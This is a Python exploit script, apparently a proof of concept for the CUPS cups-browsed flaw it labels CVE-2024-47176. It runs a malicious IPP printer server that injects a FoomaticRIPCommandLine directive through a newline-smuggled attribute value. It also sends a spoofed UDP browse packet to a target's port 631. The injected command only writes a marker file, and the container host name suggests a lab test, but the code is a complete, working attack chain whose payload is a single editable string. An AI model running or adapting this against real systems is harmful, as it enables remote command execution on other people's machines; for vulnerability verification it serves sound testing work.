import argparse
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

from scapy.all import IP, UDP, Raw, send

from ippserver.server import IPPServer, IPPRequestHandler
import ippserver.behaviour as behaviour
from ippserver.constants import (
    OperationEnum, StatusCodeEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Integer, Enum, Boolean
from ippserver.request import IppRequest


# Config
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8631
TARGET_PORT = 631

EVIL_HOST_FROM_CONTAINER = "host.docker.internal"

INJECTED_COMMAND = "echo 1 > /tmp/I_AM_VULNERABLE"


class MaliciousPrinter(behaviour.StatelessPrinter):
    def __init__(self, command):
        self.command = command
        super(MaliciousPrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            (SectionEnum.printer, b'printer-uri-supported', TagEnum.uri): [self.printer_uri],
            (SectionEnum.printer, b'uri-authentication-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'uri-security-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'printer-name', TagEnum.name_without_language): [b'Main Printer'],
            (SectionEnum.printer, b'printer-info', TagEnum.text_without_language): [b'Main Printer Info'],
            (SectionEnum.printer, b'printer-make-and-model', TagEnum.text_without_language): [b'HP 0.00'],
            (SectionEnum.printer, b'printer-state', TagEnum.enum): [Enum(3).bytes()],
            (SectionEnum.printer, b'printer-state-reasons', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'ipp-versions-supported', TagEnum.keyword): [b'1.1'],
            (SectionEnum.printer, b'operations-supported', TagEnum.enum): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,
                    OperationEnum.validate_job,
                    OperationEnum.cancel_job,
                    OperationEnum.get_job_attributes,
                    OperationEnum.get_printer_attributes,
                )],
            (SectionEnum.printer, b'multiple-document-jobs-supported', TagEnum.boolean): [Boolean(False).bytes()],
            (SectionEnum.printer, b'charset-configured', TagEnum.charset): [b'utf-8'],
            (SectionEnum.printer, b'charset-supported', TagEnum.charset): [b'utf-8'],
            (SectionEnum.printer, b'natural-language-configured', TagEnum.natural_language): [b'en'],
            (SectionEnum.printer, b'generated-natural-language-supported', TagEnum.natural_language): [b'en'],
            (SectionEnum.printer, b'document-format-default', TagEnum.mime_media_type): [b'application/pdf'],
            (SectionEnum.printer, b'document-format-supported', TagEnum.mime_media_type): [b'application/pdf'],
            (SectionEnum.printer, b'printer-is-accepting-jobs', TagEnum.boolean): [Boolean(True).bytes()],
            (SectionEnum.printer, b'queued-job-count', TagEnum.integer): [Integer(666).bytes()],
            (SectionEnum.printer, b'pdl-override-supported', TagEnum.keyword): [b'not-attempted'],
            (SectionEnum.printer, b'printer-up-time', TagEnum.integer): [Integer(self.printer_uptime()).bytes()],
            (SectionEnum.printer, b'compression-supported', TagEnum.keyword): [b'none'],
            (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
                b'https://www.google.com/"\n*FoomaticRIPCommandLine: "' +
                self.command.encode() +
                b'"\n*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip'
            ],
        }
        attr.update(super().minimal_attributes())
        return attr

    def handle_print_job(self, req, _psfile):
        print("[+] Target connected to malicious printer (CVE-2024-47176 triggered)")
        attributes = self.printer_list_attributes()
        return IppRequest(
            self.version,
            StatusCodeEnum.ok,
            req.request_id,
            attributes)


def start_malicious_ipp():
    server = IPPServer((LISTEN_HOST, LISTEN_PORT),
                       IPPRequestHandler,
                       MaliciousPrinter(INJECTED_COMMAND))
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[+] Malicious IPP server listening on {LISTEN_HOST}:{LISTEN_PORT}")
    return server


def send_browsed_packet_scapy(target_ip, target_port,
                              evil_host, evil_port):
    """Send a legacy CUPS browse packet using Scapy.

    Format (text):  "<type> <state> <printer-uri> "<location>" "<info>"
    """
    printer_type = 0x00
    printer_state = 0x03
    printer_uri = f"http://{evil_host}:{evil_port}/printers/NAME"
    printer_location = "Office HQ"
    printer_info = "Printer"

    message = (
        f'{printer_type:x} {printer_state:x} '
        f'{printer_uri} "{printer_location}" "{printer_info}"'
    ).encode("utf-8")

    pkt = IP(dst=target_ip) / UDP(sport=target_port, dport=target_port) / Raw(load=message)

    print(f"[+] Sending UDP browse packet to {target_ip}:{target_port}/udp")
    print(f"[+] Advertised printer URI: {printer_uri}")
    print(f"[+] Payload ({len(message)} bytes): {message.decode()}")
    send(pkt, verbose=0)
    print("[+] Packet sent.")


def main():
    parser = argparse.ArgumentParser(description="CUPS browse attack tool (Scapy)")
    parser.add_argument("--serve-only", action="store_true",
                        help="Only run the malicious IPP server")
    parser.add_argument("--attack", metavar="TARGET_IP",
                        help="Send browse packet to TARGET_IP and wait")
    args = parser.parse_args()

    server = start_malicious_ipp()

    if args.serve_only:
        print("[*] Verification mode. Ctrl-C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            server.shutdown()
        return

    if args.attack:
        time.sleep(0.5)
        send_browsed_packet_scapy(
            args.attack, TARGET_PORT,
            EVIL_HOST_FROM_CONTAINER, LISTEN_PORT)
        print("[*] Waiting for cups-browsed to connect...")
        print("[*] Press Ctrl-C to stop.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            server.shutdown()
        return

    parser.print_help()


if __name__ == "__main__":
    main()